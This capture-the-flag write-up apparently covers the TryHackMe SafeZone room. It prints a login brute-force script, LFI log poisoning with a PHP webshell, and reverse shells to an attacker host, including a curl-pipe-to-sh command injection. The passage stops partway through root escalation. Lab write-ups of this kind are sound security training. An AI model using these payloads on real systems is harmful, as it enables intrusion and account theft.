# SafeZone

## Introduction

Welcome to my another writeup! In this TryHackMe [SafeZone](https://tryhackme.com/room/safezone) room, you'll learn: Enumeration, Local File Inclusion (LFI) and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold: Local File Inclusion (LFI)](#initial-foothold)**
3. **[Privilege Escalation: www-data to files](#privilege-escalation)**
4. **[Privilege Escalation: files to yash](#files-to-yash)**
5. **[Privilege Escalation: yash to root](#yash-to-root)**
6. **[Conclusion](#conclusion)**

## Background

> CTF Designed by CTF lover for CTF lovers

> Difficulty: Medium

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# export RHOSTS=10.10.245.138
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 306acd1b0c69a13b6c52f12293e0ad16 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIZwg1Xg+/teSBsAyVem1Ovp/oFv0mR+IX+4/qdmqRNPhah+L7o7OJvxd9wKXci4wKKybo403rgpj9hTpAKC3JkYM9q/7p0fMcmf/gHTZIkPV/kC2Lk9RRNyYKPBTGgkyHQI5fBbbxLAIqLfScgIU3O+4EAi2DIVohjToPrrSlRF5BYgb/SGeQ0PF7xlkHLKQJb7jMAWztiCsemGP+6FSCJlw0DHHry8L41pxAaDOSGHkbIGQBZtumflUEBuyDE86aWEKJmTuMHrUAbxdwq4NEisQeGuy2Dp56U0dHk1r3gT600LDeJbgfwPX9QJjvR69+/wnFXPrscHxw1avI3tS3
|   256 84f4df873aedf2d63f50396013401f4c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDd+Ow7P3VaJCNTcFZ8VJrva7Qb5nXQwjfA4E1dZ5z2bB0nvMYS8q7stBc6G/hbIRBhtCDHO/VoF+J3Mgv+n7xQ=
|   256 9c1eafc88f034f8f40d548046b43f5c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMWsHWoXXYB4phx5IY+yiW0K8aNHbCOzAPWtMB9K4KKJ
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Whoami?
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 2 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 7.6p1 Ubuntu
80                | Apache httpd 2.4.29 ((Ubuntu))

### HTTP on Port 80

**Adding a new host to `/etc/hosts`:** (Optional, but it's a good practice to do so.)
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# echo "$RHOSTS safezone.thm" >> /etc/hosts
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221229233513.png)

**Pretty empty. Let's fire up `gobuster` to enumerate hidden directories and files:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# gobuster dir -u http://safezone.thm/ -w /usr/share/wordlists/dirb/common.txt -t 100 -x txt,bak,html,php
[...]
/dashboard.php        (Status: 302) [Size: 922] [--> index.php]
/detail.php           (Status: 302) [Size: 1103] [--> index.php]
/index.html           (Status: 200) [Size: 503]
/index.php            (Status: 200) [Size: 2372]
/logout.php           (Status: 200) [Size: 54]
/news.php             (Status: 302) [Size: 922] [--> index.php]
/note.txt             (Status: 200) [Size: 121]
/register.php         (Status: 200) [Size: 2334]
```

**`/note.txt`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# curl http://safezone.thm/note.txt   
Message from admin :-

		I can't remember my password always , that's why I have saved it in /home/files/pass.txt file .
```

Hmm. **The admin's password is in `/home/files/pass.txt`.**

**`/index.php`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221229233905.png)

A login page.

**We can try to guess admin's password, like `admin:admin`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221229233947.png)

`2 attempts remaining`. Maybe it's a brute force protection?

**Since we also found `/register.php`, let's register an account:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221229234254.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221229234311.png)

**Then login as the newly created user:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221229234344.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221229234506.png)

Hmm... **Our username is being rendered on `/dashboard.php`, maybe we can exploit Server-Side Template Injection(SSTI) and stored XSS(Cross-Site Scripting) later on?**

Let's explore this website.

**`/news.php`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221229234706.png)

`it's about LFI or is it RCE or something else?`. Maybe it's a hint?

**`/contact.php`**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221229234808.png)

It doesn't exist.

**`/detail.php`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221229234831.png)

`You can't access this feature!'`.

**Let's view the source page:**
```html
<!-- try to use "page" as GET parameter-->
</html>

<h2 style='color:Tomato;margin-left:100px;margin-top:-80px'>Find out who you are :) </h2><br><br><br><h3 style='color:red;text-align:center'>You can't access this feature!'</h3>
```

**Oh! We can supply GET parameter `page` in `/detail.php`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221229235138.png)

It seems like nothing happened?

**Let's use `ffuf` to fuzz that parameter:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u "http://safezone.thm/detail.php?page=FUZZ" -b "PHPSESSID=0q112bhkp2jn1nolv7bhghbgcb" -fs 1280
```

Nothing...

Now, let's take a step back.

**We now know:**

- The admin's password is saved in `/home/files/pass.txt`. (From `/note.txt`)
- Brute force protection in `/index.php`.
- Potential SSTI and stored XSS vulnerability in `/dashboard.php`. (The username is under attacker's control)
- After logged in, in `/detail.php` we saw a HTML comment said: `try to use "page" as GET parameter`. But nothing happen when we use that.

Hmm... **Maybe we can use the GET parameter `page` to perform LFI(Local File Inclusion) to read the content of `/home/files/pass.txt`?**

But I tried numerous ways and still no luck.

**Then I kept enumerate, enumerate and enumerate:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# gobuster dir -u http://safezone.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 100 
[...]
/~files               (Status: 301) [Size: 313] [--> http://safezone.thm/~files/]
```

Nice! We have new progress.

**Let's enumerate `/~files` directory!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# gobuster dir -u http://safezone.thm/~files/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100
[...]
/.bashrc              (Status: 200) [Size: 3771]
[...]
/.gnupg               (Status: 301) [Size: 320] [--> http://safezone.thm/~files/.gnupg/]
/.htacess             (Status: 403) [Size: 277]
/.local               (Status: 301) [Size: 320] [--> http://safezone.thm/~files/.local/]
/.profile             (Status: 200) [Size: 807]
```

Looks like this is a user Linux home directory!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230010413.png)

**But most importantly, we found `pass.txt`!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# curl http://safezone.thm/~files/pass.txt
Admin password hint :-

		admin__admin

				" __ means two numbers are there , this hint is enough I think :) "
```

**So admin's password is `admin[0-9]{2}admin`.**

Let's brute force it!

However, we need to bypass the brute force protection.

## Initial Foothold

**After poking around, I found that we can attempt 2 logins fall, then have a successful login will bypass that:**

> Note: If you want to learn more tricks to bypass brute force protection, you can read my PortSwiggers Labs [Authentication writeups](https://siunam321.github.io/ctf/#portswigger-labs).

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230010920.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230010930.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230010947.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230011000.png)

**Let's write a python script to brute force admin's password!**
```py
#!/usr/bin/env python3
import requests
from threading import Thread
from time import sleep

def sendRequest(url, password):
    loginData = {
        'username': 'admin',
        'password': password,
        'submit': 'Submit'
    } 

    loginRequest = requests.post(url, data=loginData)

    # \r to clean previous line
    print(f'[*] Trying password: {password}', end='\r')

    if 'Please enter valid login details.' not in loginRequest.text:
        print(f'[+] Found valid admin password: {password}')

def main():
    url = 'http://safezone.thm/index.php'
    
    bypassLoginData = {
        'username': 'siunam',
        'password': 'password',
        'submit': 'Submit'
    }
    
    counter = 0

    # Generate number from 00 to 99
    for number in range(99):
        counter += 1
        password = f'admin{number:02d}admin'

        # Brute force admin's password
        thread = Thread(target=sendRequest, args=(url, password))
        thread.start()
        sleep(0.2)

        # Bypass brute force protection
        if counter == 2:
            requests.post(url, data=bypassLoginData)
            counter = 0

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# python3 bruteforce.py
[+] Found valid admin password: {Redacted}
```

Found it!

**Let's login as user `admin`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230012519.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230012528.png)

Boom! We're admin!

**Let's go to `/detail.php`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230012605.png)

We have access to the `/detail.php`!

Looks like we can run some OS command?

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230012735.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230012759.png)

`details saved in a file`, and a `null` value?

**Let's try `admin`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230012935.png)

Hmm... No clue what is it.

**Now, can we use the `page` GET parameter?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230013342.png)

Oh we can!

Time to do some LFI stuff!

**Like reading `/etc/passwd`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230013424.png)

We can!

**`/etc/passwd`:**
```
root:x:0:0:root:/root:/bin/bash
[...]
yash:x:1000:1000:yash,,,:/home/yash:/bin/bash
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
files:x:1001:1001:,,,:/home/files:/bin/bash
```

- Found system users: `files` and `yash`

**Hmm... Maybe we can brute force it's password in SSH via `hydra`?**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# hydra -l 'files' -P /usr/share/wordlists/rockyou.txt ssh://$RHOSTS
[...]
[STATUS] 176.00 tries/min, 176 tries in 00:01h, 14344223 to do in 1358:22h, 16 active
[STATUS] 112.00 tries/min, 336 tries in 00:03h, 14344063 to do in 2134:32h, 16 active
```

But no dice.

**Since we have LFI, we can try to read `/detail.php` PHP source code:** 
```
/detail.php?page=php://filter/convert.base64-encode/resource=detail.php
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230014153.png)

**Then base64 decode it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230014220.png)

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# base64 -d detail.b64 > detail.php
```

```php
[...HTML code...]
<?php
$con=mysqli_connect("localhost","root","{Redacted}","db");
session_start();
if(isset($_SESSION['IS_LOGIN']))
{
$is_admin=$_SESSION['isadmin'];
echo "<h2 style='color:Tomato;margin-left:100px;margin-top:-80px'>Find out who you are :) </h2>";
echo "<br><br><br>";
if($is_admin==="true")
{
echo '<div style="align:center;" class="divf">';
echo '<form class="box" method="POST" style="text-align:center">';
echo '<input required AUTOCOMPLETE="OFF" style="text-align:center;" type="text" placeholder="user" name="name"><br><br>';
echo '<input type="submit" value="whoami" name="sub">';
echo '</form>';
echo '</div>';
if(isset($_GET["page"]))
{
		$page=$_GET["page"];
		$file = str_replace(array( "../", "..\"" ), "", $page );
		echo $file;
		include($file);
}
$formuser=mysqli_real_escape_string($con,$_POST['name']);
if(isset($_POST['sub']))
	{
		$sql="select * from user where username='$formuser'";
                $details = mysqli_fetch_assoc(mysqli_query($con,$sql));
		$det=json_encode($details);
		echo "<pre style='color:red;font-size:14px'>$det</pre>";
		$msg="Details are saved in a file";
		echo "<script>alert('details saved in a file')</script>";
	}
}
else
{
echo "<h3 style='color:red;text-align:center'>You can't access this feature!'</h3>";
}
}
else
{
header('Location: index.php');
}

?>
```

In the `$file` variable, it replacing from `../` to `.."`. **But we can bypass it via providing an absolute path.**

Anyway, let's test can we read log files. **If we can, we can do LFI log poisoning.**

**To do so, I'll start fuzzing via `ffuf`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://safezone.thm/detail.php?page=FUZZ -b "PHPSESSID=3ibin405cjdtvgnju20k1sfa6g" -fw 120
[...]
/var/log/apache2/access.log [Status: 200, Size: 53032362, Words: 5952188, Lines: 501742, Duration: 611ms]
[...]
```

**We can read `/var/log/apache2/access.log`, which means we can do LFI log poisoning, and get a reverse shell!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230020830.png)

> Note: If you can't read it, try to restart the machine. Maybe the access log file is too big, and it can't read. (Fun fact: This problem is exactly what I've encountered during the OSCP exam...)

**Next, we can injection a PHP webshell!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# curl -A '<?php echo exec($_GET[cmd]) ; ?>' http://safezone.thm
```

**Finally, we can execute command via providing GET parameter `cmd`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230023418.png)

**Let's get a reverse shell!**

- Setup a listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443
2022/12/30 02:34:35 socat[107759] N opening character device "/dev/pts/1" for reading and writing
2022/12/30 02:34:35 socat[107759] N listening on AF=2 0.0.0.0:443
```

- Send the payload: (Generated from [revshells.com](https://www.revshells.com/))

```bash
/detail.php?page=/var/log/apache2/access.log&cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.253",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230023733.png)

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443
2022/12/30 02:34:35 socat[107759] N opening character device "/dev/pts/1" for reading and writing
2022/12/30 02:34:35 socat[107759] N listening on AF=2 0.0.0.0:443
                                                                 2022/12/30 02:37:12 socat[107759] N accepting connection from AF=2 10.10.245.138:54914 on AF=2 10.9.0.253:443
                                                                  2022/12/30 02:37:12 socat[107759] N starting data transfer loop with FDs [5,5] and [7,7]
                                               www-data@safezone:/var/www/html$ 
www-data@safezone:/var/www/html$ whoami;hostname;id;ip a
www-data
safezone
uid=33(www-data) gid=33(www-data) groups=33(www-data)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:94:90:5e:ae:39 brd ff:ff:ff:ff:ff:ff
    inet 10.10.245.138/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2995sec preferred_lft 2995sec
    inet6 fe80::94:90ff:fe5e:ae39/64 scope link 
       valid_lft forever preferred_lft forever
www-data@safezone:/var/www/html$ ^C
www-data@safezone:/var/www/html$ 
```

I'm user `www-data`!

## Privilege Escalation

### www-data to files

**Let's view user `files` home directory!**
```
www-data@safezone:/var/www/html$ ls -lah /home/files
total 40K
drwxrwxrwx 5 files files 4.0K Mar 29  2021  .
drwxr-xr-x 4 root  root  4.0K Jan 29  2021  ..
-rw------- 1 files files    0 Mar 29  2021  .bash_history
-rw-r--r-- 1 files files  220 Jan 29  2021  .bash_logout
-rw-r--r-- 1 files files 3.7K Jan 29  2021  .bashrc
drwx------ 2 files files 4.0K Jan 29  2021  .cache
drwx------ 3 files files 4.0K Jan 29  2021  .gnupg
drwxrwxr-x 3 files files 4.0K Jan 30  2021  .local
-rw-r--r-- 1 files files  807 Jan 29  2021  .profile
-rw-r--r-- 1 root  root   105 Jan 29  2021 '.something#fake_can@be^here'
-rwxrwxrwx 1 root  root   112 Jan 29  2021  pass.txt
```

**Oh! That `.something#fake_can@be^here` file looks sussy:**
```
www-data@safezone:/var/www/html$ cat /home/files/.something#fake_can\@be\^here
files:$6$BUr7qnR3${Redacted}
```

That's a password hash!

**Let's crack it via `john`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt files.hash        
[...]
{Redacted}            (files)
```

**Cracked! Let's SSH to user `files`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# ssh files@$RHOSTS
files@10.10.245.138's password: 
[...]
files@safezone:~$ whoami;hostname;id;ip a
files
safezone
uid=1001(files) gid=1001(files) groups=1001(files)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:94:90:5e:ae:39 brd ff:ff:ff:ff:ff:ff
    inet 10.10.245.138/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2765sec preferred_lft 2765sec
    inet6 fe80::94:90ff:fe5e:ae39/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `files`!

### files to yash

Let's enumerate!

**Sudo permission:**
```
files@safezone:~$ sudo -l
Matching Defaults entries for files on safezone:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
    XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User files may run the following commands on safezone:
    (yash) NOPASSWD: /usr/bin/id
```

As you can see, **we can run `/usr/bin/id` as user `yash` without password!**

**But looks like we can't escalate to `yash` via that:**
```
files@safezone:~$ sudo -u yash /usr/bin/id
uid=1000(yash) gid=1000(yash) groups=1000(yash),4(adm),24(cdrom),30(dip),46(plugdev),113(lpadmin),114(sambashare)
```

**LinPEAS:**
```
┌──(root🌸siunam)-[/usr/share/peass/linpeas]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

files@safezone:~$ curl -s http://10.9.0.253/linpeas.sh | sh
[...]
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034

Potentially Vulnerable to CVE-2022-2588
[...]
```

Kernel exploit... Probably not the intended way to escalate to root.

**Listening port:**
```
files@safezone:~$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.10.245.138:68         0.0.0.0:*                           -
```

We can see there are 2 services running in localhost. **MySQL (Port 3306) and an unknown service (Port 8000).**

**Let's dig into that unknown service:**
```
files@safezone:~$ curl http://127.0.0.1:8000/
<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
</body>
</html>
```

Hmm... Let's use **port forwarding** technique to view the contents of that service.

**To do so, I'll use `chisel`:**
```
┌──(root🌸siunam)-[/opt/chisel]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

files@safezone:~$ wget http://10.9.0.253/chiselx64 -O /tmp/chisel;chmod +x /tmp/chisel
```

- Setup listening server:

```
┌──(root🌸siunam)-[/opt/chisel]
└─# ./chiselx64 server --port 4444 --reverse 
2022/12/30 03:00:55 server: Reverse tunnelling enabled
2022/12/30 03:00:55 server: Fingerprint 1Kly7Offpq09UJ6Kyj8LVCpDklgV4bpmsAm91PGU10U=
2022/12/30 03:00:55 server: Listening on http://0.0.0.0:4444
```

- Connect to the listening server:

```
files@safezone:~$ /tmp/chisel client 10.9.0.253:4444 R:8001:127.0.0.1:8000
2022/12/30 13:38:41 client: Connecting to ws://10.9.0.253:4444
2022/12/30 13:38:42 client: Connected (Latency 215.087614ms)
```

**We now can access to port 8000 localhost service via:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230030905.png)

**Let's `nmap` scan this service:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# nmap -sT -T4 -sC -sV -p8001 127.0.0.1
[...]
PORT     STATE SERVICE VERSION
8001/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: 403 Forbidden
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

It's `nginx`.

**Let's enumerate hidden directories and files via `gobuster`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# gobuster dir -u http://127.0.0.1:8001/ -w /usr/share/wordlists/dirb/big.txt -t 100 php,html
```

**At the same time, let's try to find `nginx` log files:**
```
www-data@safezone:/var/www/html$ cat /var/log/nginx/access.log
[...]
127.0.0.1 - - [29/Jan/2021:23:50:11 +0530] "GET /hey.php HTTP/1.1" 502 584 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
[...]
127.0.0.1 - - [30/Jan/2021:14:17:20 +0530] "GET /pentest.php HTTP/1.1" 404 209 "http://127.0.0.1:8000/login.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
[...]
```

Hmm... `/pentest.php`? Sounds interesting:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230031813.png)

We can send some messages to user `yash`?

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230031910.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230031916.png)

After some testing, I found that it's vulnerable to **blind OS command injection**, as no result displayed to us:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230032454.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230032533.png)

It indeed has 10 seconds time delay!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230032707.png)

```
10.10.245.138 - - [30/Dec/2022 03:26:41] "GET / HTTP/1.1" 200 -
```

Cool.

**Now we can try to get a reverse shell!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4445
2022/12/30 03:28:04 socat[135993] N opening character device "/dev/pts/1" for reading and writing
2022/12/30 03:28:04 socat[135993] N listening on AF=2 0.0.0.0:4445
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# nano revshell.sh                                   
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.253",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

**Payload:**
```bash
; curl http://10.9.0.253/revshell.sh | sh
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SafeZone/images/Pasted%20image%2020221230033507.png)

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4445
2022/12/30 03:28:04 socat[135993] N opening character device "/dev/pts/1" for reading and writing
2022/12/30 03:28:04 socat[135993] N listening on AF=2 0.0.0.0:4445
                                                                  2022/12/30 03:34:29 socat[135993] N accepting connection from AF=2 10.10.245.138:43252 on AF=2 10.9.0.253:4445
                                                                    2022/12/30 03:34:29 socat[135993] N starting data transfer loop with FDs [5,5] and [7,7]
                                                 yash@safezone:/opt$ 
yash@safezone:/opt$ export TERM=xterm-256color
yash@safezone:/opt$ stty rows 23 columns 103
yash@safezone:/opt$ whoami;hostname;id;ip a
yash
safezone
uid=1000(yash) gid=1000(yash) groups=1000(yash),4(adm),24(cdrom),30(dip),46(plugdev),113(lpadmin),114(sambashare)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:94:90:5e:ae:39 brd ff:ff:ff:ff:ff:ff
    inet 10.10.245.138/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3137sec preferred_lft 3137sec
    inet6 fe80::94:90ff:fe5e:ae39/64 scope link 
       valid_lft forever preferred_lft forever
```

Boom! I'm user `yash`!

**flag.txt:**
```
yash@safezone:/opt$ cat /home/yash/flag.txt 
THM{Redacted}
```

### yash to root

**Sudo permission:**
```
yash@safezone:/opt$ sudo -l
Matching Defaults entries for yash on safezone:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User yash may run the following commands on safezone:
    (root) NOPASSWD: /usr/bin/python3 /root/bk.py
```

**We can run `/usr/bin/python3 /root/bk.py` as root without password!**
```
yash@safezone:/opt$ sudo /usr/bin/python3 /root/bk.py
Enter filename: /etc/passwd
Enter destination: /tmp/passwd.bak
Enter Password: anything
```

```
yash@safezone:/opt$ ls -lah /tmp
[...]
-rw-r--r--  1 root  root  1.7K Dec 30 14:08 passwd.bak
```

```
yash@safezone:/opt$ cat /tmp/passwd.bak  
root:x:0:0:root:/root:/bin/bash
